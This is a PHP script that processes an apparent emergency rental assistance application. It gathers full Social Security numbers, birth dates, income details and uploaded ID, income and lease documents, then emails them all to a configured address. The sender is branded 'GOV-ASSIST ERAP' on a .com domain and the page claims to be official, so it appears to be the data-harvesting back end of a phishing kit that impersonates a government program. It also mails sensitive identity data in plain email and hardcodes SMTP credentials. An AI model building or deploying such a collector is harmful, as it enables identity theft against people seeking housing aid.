<?php
/**
 * ERAP Application Processor
 * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
 */
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require_once __DIR__ . '/mailer-lite.php';

$smtpHost = 'smtp.your-agency.gov';
$smtpPort = 587;
$smtpUser = 'smtp-user';
$smtpPass = 'smtp-password';
$fromEmail = 'no-reply@gov-assist-portal.com';
$toEmail   = 'applications@your-agency-portal.com';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (!isset($_POST['csrf_token'], $_SESSION['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("Security error: Invalid submission.");
    }

    $clean = function ($key) {
        return isset($_POST[$key]) ? trim(filter_var($_POST[$key], FILTER_SANITIZE_SPECIAL_CHARS)) : '';
    };

    $allowedExt = ['pdf', 'jpg', 'jpeg', 'png'];
    $maxSize = 5 * 1024 * 1024; // 5MB

    $validateUpload = function ($file, $required = true, $label = '') use ($allowedExt, $maxSize) {
        if (!isset($file) || $file['error'] === UPLOAD_ERR_NO_FILE) {
            if ($required) {
                throw new Exception("Missing required upload: {$label}");
            }
            return null;
        }
        if ($file['error'] !== UPLOAD_ERR_OK) {
            throw new Exception("Upload error for {$label}");
        }
        if ($file['size'] > $maxSize) {
            throw new Exception("{$label} exceeds size limit.");
        }
        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        if (!in_array($ext, $allowedExt, true)) {
            throw new Exception("Invalid file type for {$label}");
        }
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mime = $finfo->file($file['tmp_name']);
        $allowedMime = ['application/pdf', 'image/jpeg', 'image/png'];
        if (!in_array($mime, $allowedMime, true)) {
            throw new Exception("Invalid MIME type for {$label}");
        }
        return $file;
    };

    $name             = $clean('full_name');
    $dob              = $clean('date_of_birth');
    $email            = $clean('email');
    $phone            = $clean('phone');
    $ssn              = $clean('ssn'); // Full SSN required
    $address          = $clean('address');
    $city             = $clean('city');
    $state            = $clean('state');
    $zip              = $clean('zip');
    $employment       = $clean('employment_status');
    $employer         = $clean('employer_name');
    $household_size   = $clean('household_size');
    $income           = $clean('income');
    $income_sources   = $clean('income_sources');
    $current_rent     = $clean('current_rent');
    $months_past_due  = $clean('months_past_due');
    $total_arrears    = $clean('total_arrears');
    $future_rent      = $clean('future_rent');
    $total_assistance = $clean('total_assistance');
    $hardship         = $clean('hardship');
    $landlord_name    = $clean('landlord_name');
    $landlord_phone   = $clean('landlord_phone');
    $landlord_email   = $clean('landlord_email');
    $landlord_accepts = isset($_POST['landlord_accepts_payments']) ? 'Yes' : 'No';
    $rent_past_due    = $clean('rent_past_due');
    $rent_future      = $clean('rent_future');
    $utility_request  = isset($_POST['utility_assistance']) ? implode(', ', (array)$_POST['utility_assistance']) : 'None selected';
    $assistance_total = $clean('assistance_total');
    $contact_auth     = isset($_POST['contact_authorization']) ? 'Yes' : 'No';
    $accuracy_cert    = isset($_POST['accuracy_certification']) ? 'Yes' : 'No';
    $attestation      = isset($_POST['attestation']) ? 'Yes' : 'No';
    $digital_signature= $clean('digital_signature');
    $signature_date   = $clean('signature_date');

    if (empty($name) || empty($email) || empty($ssn)) {
        die("Security error: Missing required fields.");
    }

    $fields = [
        "FULL NAME" => $name,
        "DATE OF BIRTH" => $dob,
        "EMAIL" => $email,
        "PHONE" => $phone,
        "FULL SSN" => $ssn,
        "STREET ADDRESS" => $address,
        "CITY" => $city,
        "STATE" => $state,
        "ZIP" => $zip,
        "EMPLOYMENT STATUS" => $employment,
        "EMPLOYER NAME" => $employer,
        "HOUSEHOLD SIZE" => $household_size,
        "ANNUAL HOUSEHOLD INCOME" => $income,
        "INCOME SOURCES" => $income_sources,
        "CURRENT MONTHLY RENT" => $current_rent,
        "MONTHS PAST DUE" => $months_past_due,
        "TOTAL ARREARS" => $total_arrears,
        "FUTURE RENT REQUESTED" => $future_rent,
        "TOTAL ASSISTANCE REQUESTED" => $total_assistance,
        "HARDSHIP DESCRIPTION" => $hardship,
        "LANDLORD/PROPERTY MANAGER NAME" => $landlord_name,
        "LANDLORD PHONE" => $landlord_phone,
        "LANDLORD EMAIL" => $landlord_email,
        "LANDLORD ACCEPTS DIRECT PAYMENT" => $landlord_accepts,
        "RENT ASSISTANCE (PAST DUE)" => $rent_past_due,
        "RENT ASSISTANCE (FUTURE)" => $rent_future,
        "UTILITY ASSISTANCE REQUESTED" => $utility_request,
        "TOTAL AMOUNT REQUESTED (ALL CATEGORIES)" => $assistance_total,
        "CONTACT AUTHORIZATION" => $contact_auth,
        "ACCURACY CERTIFICATION" => $accuracy_cert,
        "ATTESTATION" => $attestation,
        "DIGITAL SIGNATURE" => $digital_signature,
        "SIGNATURE DATE" => $signature_date,
    ];

    $message = "Official ERAP Application Received\n";
    $message .= "====================================\n\n";
    foreach ($fields as $label => $value) {
        $message .= "{$label}: {$value}\n";
    }
    $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";

    try {
        $attachments = [];
        $attachments[] = $validateUpload($_FILES['id_document'] ?? null, true, 'Government-issued ID');
        $attachments[] = $validateUpload($_FILES['income_proof'] ?? null, true, 'Proof of Income');
        $attachments[] = $validateUpload($_FILES['lease_agreement'] ?? null, true, 'Lease Agreement');
        $attachments[] = $validateUpload($_FILES['eviction_notice'] ?? null, true, 'Eviction or Past-Due Notice');

        if (isset($_FILES['utility_bills'])) {
            foreach ($_FILES['utility_bills']['tmp_name'] as $idx => $tmp) {
                $file = [
                    'tmp_name' => $tmp,
                    'name' => $_FILES['utility_bills']['name'][$idx],
                    'type' => $_FILES['utility_bills']['type'][$idx],
                    'error' => $_FILES['utility_bills']['error'][$idx],
                    'size' => $_FILES['utility_bills']['size'][$idx],
                ];
                $validated = $validateUpload($file, false, 'Utility Bill');
                if ($validated) {
                    $attachments[] = $validated;
                }
            }
        }

        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->Host = $smtpHost;
        $mail->Port = $smtpPort;
        $mail->Username = $smtpUser;
        $mail->Password = $smtpPass;
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = 'tls';
        $mail->setFrom($fromEmail, 'GOV-ASSIST ERAP');
        $mail->addAddress($toEmail);
        $mail->addReplyTo($email);
        $mail->Subject = "NEW ERAP APPLICATION: {$name}";
        $mail->Body = $message;
        $mail->AltBody = strip_tags($message);
        $mail->isHTML(false);

        foreach ($attachments as $file) {
            if (!$file) { continue; }
            $mail->addAttachment($file['tmp_name'], $file['name']);
        }

        if ($mail->send()) {
            header("Location: ../success.html");
            exit();
        }

        throw new Exception("Mailer Error: " . $mail->ErrorInfo);
    } catch (Exception $e) {
        echo "<h1>Application Error</h1>";
        echo "<p>We were unable to process your application at this time. Please contact support.</p>";
        echo "<pre>" . htmlspecialchars($e->getMessage()) . "</pre>";
        echo "<a href='../erap-apply.html'>Go Back</a>";
    }
} else {
    header("Location: ../index.html");
    exit();
}
